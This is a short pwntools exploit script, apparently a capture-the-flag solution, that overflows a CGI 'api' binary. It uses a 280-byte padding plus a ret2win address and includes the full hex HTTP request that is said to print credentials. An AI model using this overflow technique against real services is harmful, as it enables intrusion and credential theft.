from pwn import *


# initialize the binary
binary = "../web/www/api"
elf = context.binary = ELF(binary, checksec=False)

gs = """
break main
continue
"""

# envvars
env = {
    "PATH_INFO": "/create",
    "REQUEST_METHOD": "POST",
    "HTTP_COOKIE": "session=ed3f2d85696656f4ea64a0f1d5ceb399",
    "CONTENT_LENGTH": "291",
}

if args.GDB:
    p = gdb.debug(binary, gdbscript=gs, env=env)
else:
    p = elf.process(env=env)


# payload to leak libc
payload = b'A'*280
payload += p64(0x401016)                # ret
payload += p64(0x40165b)                # ret2win

p.sendline(payload)

p.interactive()

"""
This is the hex for the raw HTTP request that will exploit the buffer overflow and print out credentials:

50 4F 53 54 20 2F 61 70 69 2F 63 72 65 61 74 65 20 48 54 54 50 2F 31 2E 31 0D 0A 48 6F 73 74 3A 20 6C 6F 63 61 6C 68 6F 73 74 3A 33 30 30 30 0D 0A 43 6F 6F 6B 69 65 3A 20 73 65 73 73 69 6F 6E 3D 65 64 33 66 32 64 38 35 36 39 36 36 35 36 66 34 65 61 36 34 61 30 66 31 64 35 63 65 62 33 39 39 73 0D 0A 43 6F 6E 6E 65 63 74 69 6F 6E 3A 20 63 6C 6F 73 65 0D 0A 43 6F 6E 74 65 6E 74 2D 54 79 70 65 3A 20 61 70 70 6C 69 63 61 74 69 6F 6E 2F 6F 63 74 65 74 2D 73 74 72 65 61 6D 0D 0A 43 6F 6E 74 65 6E 74 2D 4C 65 6E 67 74 68 3A 20 32 39 36 0D 0A 0D 0A 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 16 10 40 00 00 00 00 00 5B 16 40 00 00 00 00 00
"""